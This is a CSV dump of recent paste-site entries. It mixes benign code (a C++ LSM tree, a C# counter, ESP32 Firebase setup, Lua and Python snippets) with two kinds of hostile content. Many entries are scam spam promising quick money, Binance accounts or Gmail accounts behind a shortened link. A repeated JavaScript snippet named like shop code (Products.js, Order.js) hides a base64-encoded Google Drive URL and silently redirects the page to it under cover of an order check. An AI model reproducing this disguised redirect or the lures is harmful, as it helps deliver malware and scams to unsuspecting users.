id,title,username,language,date,content
QFd0wube,EARN $900 INSTANTLY 2025 5D,KRATOSPASTEBIN3,JavaScript,Wednesday 26th of March 2025 01:04:56 PM CDT," 
Pdf https://tinyurl.com/methodssss


q7d6lKB8y9
"
jygbwg9m,Untitled,navrajkhunger,JavaScript,Wednesday 26th of March 2025 01:04:19 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/964/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
09qPs16v,Binance account BC,Hackets,JavaScript,Wednesday 26th of March 2025 12:59:18 PM CDT," 
Pdf https://tinyurl.com/methodssss


LyWpdEbgA5
"
bpvjk8T0,Untitled,ElijahCrafter,Lua,Wednesday 26th of March 2025 12:57:22 PM CDT,"local IDENTIFIER = user
local DELAY_TIME = 60

local function main_loop()
  while true do
    local x, y, z = gps.locate()
    peripheral.call(""back"", ""transmit"", 1500, 1500, {identifier = IDENTIFIER, x, y, z})
    sleep(DELAY_TIME)
  end
end

local function _shell()
  shell.run(""shell"")
end

parallel.waitForAny(main_loop, _shell)"
XdCJ7NKP,EARN $900 INSTANTLY 2025 5D,Hackets,JavaScript,Wednesday 26th of March 2025 12:57:13 PM CDT," 
Pdf https://tinyurl.com/methodssss


1peLO809c4
"
s4kaXzx4,Random Gmail Acc 36,Hackets,JavaScript,Wednesday 26th of March 2025 12:55:08 PM CDT," 
Pdf https://tinyurl.com/methodssss


MQX9ARCWpp
"
FkJp6Qc3,Make $1000 15-MINUTES (BEGINNER) F1,Hackets,JavaScript,Wednesday 26th of March 2025 12:53:05 PM CDT," 
Pdf https://tinyurl.com/methodssss


B8LlaNDRI2
"
NsgAjrNT,Binance account BC,Hackets,JavaScript,Wednesday 26th of March 2025 12:51:01 PM CDT," 
Pdf https://tinyurl.com/methodssss


gkoR824XaA
"
DGCv2tYV,Products.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 12:48:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/685/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mtT0JnNf,EARN $900 INSTANTLY 2025 5D,Hackets,JavaScript,Wednesday 26th of March 2025 12:48:54 PM CDT," 
Pdf https://tinyurl.com/methodssss


xh8BRg59IA
"
Juw4mjT1,Make $1000 15-MINUTES (BEGINNER) F1,danecar21,JavaScript,Wednesday 26th of March 2025 12:45:02 PM CDT," 
Pdf https://tinyurl.com/methodssss


g684nCGMc4
"
2VViz9in,Make $1000 15-MINUTES (BEGINNER) F1,XtuK,JavaScript,Wednesday 26th of March 2025 12:42:36 PM CDT," 
Pdf https://tinyurl.com/methodssss


8G6LyytDZt
"
tfu5QuuU,Binance account BC,XtuK,JavaScript,Wednesday 26th of March 2025 12:40:31 PM CDT," 
Pdf https://tinyurl.com/methodssss


SwCvDbp4y1
"
j95EsM34,EARN $900 INSTANTLY 2025 5D,XtuK,JavaScript,Wednesday 26th of March 2025 12:38:27 PM CDT," 
Pdf https://tinyurl.com/methodssss


kXJUIOOyIE
"
HS98E4vY,Random Gmail Acc 36,XtuK,JavaScript,Wednesday 26th of March 2025 12:36:22 PM CDT," 
Pdf https://tinyurl.com/methodssss


UBwMwr3cn3
"
2n0R4PYz,Make $1000 15-MINUTES (BEGINNER) F1,XtuK,JavaScript,Wednesday 26th of March 2025 12:34:17 PM CDT," 
Pdf https://tinyurl.com/methodssss


zraZ4GFvlu
"
jPxdBVN5,Order.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 12:33:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/231/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
knzncJy5,Binance account BC,XtuK,JavaScript,Wednesday 26th of March 2025 12:32:13 PM CDT," 
Pdf https://tinyurl.com/methodssss


rCwVKOEJhQ
"
TkMTUHzx,LazyThreadSafeCookieCounter,Catsher,C#,Wednesday 26th of March 2025 12:30:14 PM CDT,"using System.Diagnostics;

namespace ConsoleTestApp;

public class LazyThreadSafeCookieCounter 
{
    private readonly object _cookiesLock = new();
    private int _cookies = 0; 
    public int Cookies { get => _cookies; private set => _cookies = value; }

    private static readonly object _instanceLock = new();
    private static LazyThreadSafeCookieCounter? Instance { get; set; }

    private LazyThreadSafeCookieCounter() { }

    public static LazyThreadSafeCookieCounter GetInstance()
    {
        lock (_instanceLock)
        {
            Instance ??= new LazyThreadSafeCookieCounter();
        }

        return Instance;
    }

    public void IncrementCookie()
    {
        Interlocked.Increment(ref _cookies);
    }

    public void ClearCookies()
    {
        Cookies = 0;
    }
}

public static class Program
{
    public async static Task Main()
    {
        var cookieCounter = LazyThreadSafeCookieCounter.GetInstance();

        IncrementTenMillionTimes(cookieCounter).RunSynchronously();
        cookieCounter.ClearCookies();
        GC.Collect();

        Console.WriteLine(""Cookies amount before: "" + cookieCounter.Cookies);

        var stopwatch = new Stopwatch();
        
        var task = IncrementTenMillionTimes(cookieCounter);

        stopwatch.Start();
        task.RunSynchronously();
        stopwatch.Stop();
        
        Console.WriteLine(""Cookies amount after: "" + cookieCounter.Cookies);
        Console.WriteLine(""Time spent: "" + stopwatch.Elapsed.TotalMilliseconds + "" ms""); 
        Console.WriteLine(""Done."");
    }

    public static Task IncrementTenMillionTimes(LazyThreadSafeCookieCounter cookieCounter)
    {
        void incrementHundredThousandTimes()
        {
            for (var i = 0; i < 100_000; i++)
                cookieCounter.IncrementCookie();
        }

        return new Task(() =>
        {
            Parallel.For(fromInclusive: 0,
                        toExclusive: 100,
                        (int iteration, ParallelLoopState loopState) => incrementHundredThousandTimes());
        });
    }
}
"
yERqvi41,EARN $900 INSTANTLY 2025 5D,XtuK,JavaScript,Wednesday 26th of March 2025 12:30:10 PM CDT," 
Pdf https://tinyurl.com/methodssss


Lzl2GAmw0p
"
6dFWVDfn,Random Gmail Acc 36,XtuK,JavaScript,Wednesday 26th of March 2025 12:28:07 PM CDT," 
Pdf https://tinyurl.com/methodssss


2DFnlbqFad
"
FcFsfTxq,Make $1000 15-MINUTES (BEGINNER) F1,XtuK,JavaScript,Wednesday 26th of March 2025 12:26:00 PM CDT," 
Pdf https://tinyurl.com/methodssss


YiGFWC0JAv
"
9F9PVViP,Binance account BC,XtuK,JavaScript,Wednesday 26th of March 2025 12:23:56 PM CDT," 
Pdf https://tinyurl.com/methodssss


Zp733vuR6t
"
XQUNyfL9,EARN $900 INSTANTLY 2025 5D,XtuK,JavaScript,Wednesday 26th of March 2025 12:21:53 PM CDT," 
Pdf https://tinyurl.com/methodssss


VuqH2xS7h3
"
96qySFKq,Random Gmail Acc 36,XtuK,JavaScript,Wednesday 26th of March 2025 12:19:48 PM CDT," 
Pdf https://tinyurl.com/methodssss


F4y9BpULxx
"
7Ve1Jn9u,Market.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 12:18:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/054/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DnC2JMrk,or,black_duck11,Python,Wednesday 26th of March 2025 12:15:50 PM CDT,"import random
import time
print('o-orzeł')
print('r-reszka')
print('0-zakończenie gry')
gracz=0
komputer=0
while True:
    wybor=input('Twój wybór to: ')
    if wybor==""0"":break
    elif wybor=='r':wybor='reszka'
    elif wybor=='o':wybor='orzeł'
    else:
        print(""Dokonaj prawidłowego wyboru"")
        print('o-orzeł')
        print('r-reszka')
        print('0-zakończenie gry')
        continue
    rzut=random.choice([""orzeł"",""reszka""])
    time.sleep(3)
    print(f'Wynik rzutu: {rzut}')
    if wybor==rzut:
        gracz+=1
    else:
        komputer+=1
    print(""Wyniki łącznie"")

    print(f'Komputer: {komputer}')
    print(f'Użytkownik: {gracz}')
"
xDrwTZE8,Redka Compact Init ver 3.0,scottish_esquire,C++,Wednesday 26th of March 2025 12:14:06 PM CDT,"#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <map>
#include <filesystem>
#include <chrono>
#include <thread>
#include <algorithm>
#include <cmath>

namespace fs = std::filesystem;

// Конфигурация
const size_t WAL_SIZE_THRESHOLD = 1024; // 1KB
const size_t LEVEL_BASE_SIZE = 10;      // L0: 10 записей, L1: 100, L2: 1000...
const std::string WAL_FILENAME = ""wal.log"";
const std::string DB_DIR = ""lsm_db"";

#pragma pack(push, 1)
struct SSTHeader {
    uint32_t version = 1;
    uint32_t entry_count;
    uint64_t index_offset;
};

struct SSTIndexEntry {
    uint32_t key_length;
    uint64_t data_offset;
    uint32_t data_length;
};
#pragma pack(pop)

struct WalEntry {
    std::string key;
    std::string value;
};

struct SSTEntry {
    std::string key;
    std::string value;

    bool operator<(const SSTEntry& other) const {
        return key < other.key;
    }
};

class LSMTree {
private:
    std::vector<std::vector<std::string>> levels; // Пути к SST-файлам по уровням

    void ensureDbDir() {
        if (!fs::exists(DB_DIR)) {
            fs::create_directory(DB_DIR);
            for (int i = 0; i < 10; ++i) {
                fs::create_directory(DB_DIR + ""/L"" + std::to_string(i));
            }
        }
    }

    void loadLevels() {
        levels.clear();
        for (int i = 0; ; ++i) {
            std::string level_dir = DB_DIR + ""/L"" + std::to_string(i);
            if (!fs::exists(level_dir)) break;

            std::vector<std::string> files;
            for (const auto& entry : fs::directory_iterator(level_dir)) {
                if (entry.path().extension() == "".sst"") {
                    files.push_back(entry.path().string());
                }
            }
            std::sort(files.begin(), files.end());
            levels.push_back(files);
        }
    }

    void compactLevel(int level) {
        if (level >= levels.size()) return;
        
        std::vector<SSTEntry> merged_entries;
        
        // 1. Собираем все записи с текущего уровня
        for (const auto& sst_path : levels[level]) {
            auto entries = readSST(sst_path);
            merged_entries.insert(merged_entries.end(), entries.begin(), entries.end());
        }

        // 2. Если записей достаточно для следующего уровня
        if (merged_entries.size() >= LEVEL_BASE_SIZE * std::pow(10, level)) {
            // Сортируем и удаляем дубликаты
            std::sort(merged_entries.begin(), merged_entries.end());
            auto last = std::unique(merged_entries.begin(), merged_entries.end(),
                [](const auto& a, const auto& b) { return a.key == b.key; });
            merged_entries.erase(last, merged_entries.end());

            // 3. Записываем на следующий уровень
            std::string new_sst = DB_DIR + ""/L"" + std::to_string(level + 1) + ""/"" +
                                 std::to_string(std::chrono::system_clock::now().time_since_epoch().count()) + "".sst"";
            writeSST(new_sst, merged_entries);

            // 4. Удаляем старые файлы
            for (const auto& sst_path : levels[level]) {
                fs::remove(sst_path);
            }

            // 5. Обновляем индексы
            loadLevels();
            
            // 6. Рекурсивно уплотняем следующий уровень
            compactLevel(level + 1);
        }
    }

    std::vector<SSTEntry> readSST(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        SSTHeader header;
        file.read(reinterpret_cast<char*>(&header), sizeof(header));

        std::vector<SSTIndexEntry> index(header.entry_count);
        file.seekg(header.index_offset);
        file.read(reinterpret_cast<char*>(index.data()), header.entry_count * sizeof(SSTIndexEntry));

        std::vector<SSTEntry> entries;
        for (const auto& idx : index) {
            file.seekg(idx.data_offset);
            uint32_t total_len;
            file.read(reinterpret_cast<char*>(&total_len), sizeof(total_len));

            std::string key(idx.key_length, '\0');
            file.read(&key[0], idx.key_length);

            std::string value(total_len - idx.key_length, '\0');
            file.read(&value[0], value.size());

            entries.push_back({key, value});
        }

        return entries;
    }

    void writeSST(const std::string& path, const std::vector<SSTEntry>& entries) {
        std::ofstream file(path, std::ios::binary);
        SSTHeader header;
        header.entry_count = entries.size();
        file.write(reinterpret_cast<char*>(&header), sizeof(header));

        std::vector<SSTIndexEntry> index;
        for (const auto& entry : entries) {
            SSTIndexEntry idx;
            idx.key_length = entry.key.size();
            idx.data_offset = file.tellp();

            uint32_t total_len = sizeof(uint32_t) + entry.key.size() + entry.value.size();
            file.write(reinterpret_cast<char*>(&total_len), sizeof(total_len));
            file.write(entry.key.data(), entry.key.size());
            file.write(entry.value.data(), entry.value.size());

            idx.data_length = total_len;
            index.push_back(idx);
        }

        header.index_offset = file.tellp();
        for (const auto& idx : index) {
            file.write(reinterpret_cast<const char*>(&idx), sizeof(idx));
        }

        file.seekp(0);
        file.write(reinterpret_cast<char*>(&header), sizeof(header));
    }

    std::vector<WalEntry> readWalFile(const std::string& filename) {
        std::vector<WalEntry> entries;
        std::ifstream wal(filename);
        if (!wal) return entries;
    
        std::string line;
        while (std::getline(wal, line)) {
            // Пропускаем пустые строки
            if (line.empty()) continue;
    
            // Парсим строку вида {@id {data}}
            size_t id_start = line.find('{');
            size_t id_end = line.find(' ', id_start);
            size_t data_start = line.find('{', id_end);
            size_t data_end = line.rfind('}');
    
            if (id_start == std::string::npos || 
                id_end == std::string::npos || 
                data_start == std::string::npos || 
                data_end == std::string::npos) {
                std::cerr << ""Invalid WAL entry: "" << line << std::endl;
                continue;
            }
    
            // Извлекаем ID (формат {@b0b-1})
            std::string id = line.substr(id_start + 2, id_end - id_start - 2);
            
            // Извлекаем данные (всё содержимое между {})
            std::string data = line.substr(data_start, data_end - data_start + 1);
    
            entries.push_back({id, data});
        }
    
        return entries;
    }

public:
    LSMTree() {
        ensureDbDir();
        loadLevels();
    }

    void put(const std::string& key, const std::string& value) {
        // 1. Добавляем в WAL в правильном формате
        std::ofstream wal(WAL_FILENAME, std::ios::app);
        wal << ""{@"" << key << "" "" << value << ""}\n"";  // Формат: {@key value}
        wal.close();
    
        // 2. Проверяем размер WAL
        if (fs::file_size(WAL_FILENAME) >= WAL_SIZE_THRESHOLD) {
            flushWalToL0();
        }
    }

    void flushWalToL0() {
        // 1. Читаем WAL с новым парсером
        auto wal_entries = readWalFile(WAL_FILENAME);
        std::map<std::string, std::string> latest_data;
        
        // Оставляем только последние версии
        for (const auto& e : wal_entries) {
            latest_data[e.key] = e.value;
        }
    
        // 2. Записываем в SST
        std::vector<SSTEntry> entries;
        for (const auto& [key, value] : latest_data) {
            entries.push_back({key, value});
        }
    
        // 3. Создаем новый SST-файл
        std::string sst_path = DB_DIR + ""/L0/"" +
                              std::to_string(std::chrono::system_clock::now().time_since_epoch().count()) + "".sst"";
        writeSST(sst_path, entries);
    
        // 4. Очищаем WAL
        std::ofstream wal(WAL_FILENAME, std::ios::trunc);
    
        // 5. Обновляем индексы и запускаем компактизацию
        loadLevels();
        compactLevel(0);
    }

    std::string get(const std::string& key) {
        // 1. Проверяем WAL (новые данные)
        auto wal_entries = readWalFile(WAL_FILENAME);
        std::string last_value;
        for (const auto& e : wal_entries) {
            if (e.key == key) last_value = e.value;
        }
        if (!last_value.empty()) return last_value;
    
        // 2. Ищем в SST-файлах (от новых к старым)
        for (const auto& level : levels) {
            for (const auto& sst_path : level) {
                auto entries = readSST(sst_path);
                for (const auto& e : entries) {
                    if (e.key == key) return e.value;
                }
            }
        }
        
        return """"; // Не найдено
    }
};

int main() {
    LSMTree db;
    
    // Теперь данные записываются в правильном формате
    db.put(""b0b-1"", ""{name:\""Alena\"" age:25}"");
    db.put(""b0b-2"", ""{name:\""Ilia\"" age:30}"");
    db.put(""b0b-1"", ""{name:\""Alena\"" age:26}""); // Обновление
    db.put(""b0b-3"", ""{name:\""Stepan\""}"");
    db.put(""b0b-4"", ""{name:\""Dima\""}"");

    for (size_t i = 0; i < 1000; i++) {
        db.put(""b0b-4"", ""{name:\""Dima\""}"");
    }
    
    // Принудительная запись в SST
    db.flushWalToL0();
    
    // Проверка
    std::cout << ""b0b-1: "" << db.get(""b0b-1"") << std::endl;
    std::cout << ""b0b-2: "" << db.get(""b0b-2"") << std::endl;
    std::cout << ""b0b-3: "" << db.get(""b0b-3"") << std::endl;
    std::cout << ""b0b-4: "" << db.get(""b0b-4"") << std::endl;
    
    return 0;
}"
KJauCWtw,Untitled,navrajkhunger,JavaScript,Wednesday 26th of March 2025 12:02:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/191/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fHdFViGU,Products.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 11:47:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/181/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5bJMRK5d,ESP32 Firebase,ariefhendra,Arduino,Wednesday 26th of March 2025 11:36:31 AM CDT,"#include <Arduino.h>
#if defined(ESP32)
	#include <WiFi.h>
#elif defined(ESP8266)
 	#include <ESP8266WiFi.h>
#endif
#include <Firebase_ESP_Client.h>

// Menyediakan info tentang proses pembuatan token.
#include ""addons/TokenHelper.h""

// Menyediakan info pencetakan muatan dari database dan fungsi bantuan lainnya
#include ""addons/RTDBHelper.h""

// Masukkan info untuk masuk ke jaringan internet
#define WIFI_SSID ""ISIKAN_NAMA_ACCESS_POINT""
#define WIFI_PASSWORD ""ISIKAN_KATA_SANDI_ACCESS_POINT""

// Masukkan Project API Key dari Firebase
#define API_KEY ""ISIKAN_PROJECT_API_KEY_DARI_FIREBASE""

// Masukkan alamat email dan kata sandi untuk mengakses Firebase
#define USER_EMAIL ""ISIKAN_EMAIL_UNTUK_LOGIN""
#define USER_PASSWORD ""ISIKAN_KATA_SANDI_UNTUK_LOGIN""

// Mendeklarasikan objek-objek dari Firebase
FirebaseData fbdo;
FirebaseAuth auth;
FirebaseConfig config;

// Variabel untuk menyimpan USER UID dari Firebase
String uid;

// Fungsi untuk koneksi ke WiFi
void initWiFi() 
{
	WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
 	Serial.print(""Connecting to WiFi .."");
 	while (WiFi.status() != WL_CONNECTED) 
    {
 		Serial.print('.');
 		delay(1000);
 	}
 	Serial.println(WiFi.localIP());
 	Serial.println();
}

void setup()
{
 	Serial.begin(115200); 

	// Inisialisasi WiFi
	initWiFi();

 	// Memasukkan API KEY dari Firebase
 	config.api_key = API_KEY;
 
 	// Memasukkan info login ke Firebase
 	auth.user.email = USER_EMAIL;
 	auth.user.password = USER_PASSWORD;
 	Firebase.reconnectWiFi(true);
 	fbdo.setResponseSize(4096);
 
 	// Menjalankan fungsi pemanggil bila pembuatan token berjalan lama
 	config.token_status_callback = tokenStatusCallback; //mengakses addons/TokenHelper.h
 
 	// Mendeklarasikan jumlah pengulangan maksimal untuk pembuatan token
 	config.max_token_generation_retry = 5;
    
 	// Menjalankan proses otentikasi di Firebase
 	Firebase.begin(&config, &auth);

 	// Mendapatkan USER UID setelah beberapa saat
 	Serial.println(""Getting User UID"");
 	while ((auth.token.uid) == """") 
    {
 		Serial.print('.');
 		delay(1000);
 	}
 
 	// Menampilkan USER UID dari Firebase
 	uid = auth.token.uid.c_str();
 	Serial.print(""User UID: "");
 	Serial.print(uid);
}

void loop()
{
}"
pwPDgrkJ,Order.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 11:31:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/563/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TkMriBuv,Market.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 11:16:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/983/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JCnfaKXq,pericheck,alexnolan,Lua,Wednesday 26th of March 2025 11:03:20 AM CDT,"-- Create a diagnostic program
print(""Detailed peripheral information:"")
for _, name in pairs(peripheral.getNames()) do
    local pType = peripheral.getType(name)
    print(name .. "" is type: "" .. pType)
    
    -- List all methods available on this peripheral
    print(""Available methods:"")
    local methods = {}
    for method, _ in pairs(peripheral.getMethods(name)) do
        table.insert(methods, method)
    end
    textutils.tabulate(methods)
end
"
bh6vs3KL,Untitled,navrajkhunger,JavaScript,Wednesday 26th of March 2025 11:00:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/359/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kkyJyWJb,Products.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 10:45:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/353/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
